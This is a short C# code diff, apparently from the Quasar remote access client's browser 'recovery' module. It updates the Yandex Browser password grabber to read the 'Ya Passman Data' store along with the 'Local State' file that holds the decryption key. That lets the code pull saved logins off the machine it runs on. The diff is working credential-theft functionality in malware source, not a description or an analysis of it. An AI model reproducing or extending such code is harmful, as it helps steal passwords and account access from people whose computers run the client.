@@ -16,8 +16,10 @@ namespace Quasar.Client.Recovery.Browsers
             try
             {
                 string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
-                return ReadAccounts(filePath, ApplicationName);
+                "Yandex\\YandexBrowser\\User Data\\Default\\Ya Passman Data");
+                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+                    "Yandex\\YandexBrowser\\User Data\\Local State");
+                return ReadAccounts(filePath, localStatePath);
             }
             catch (Exception)
             {
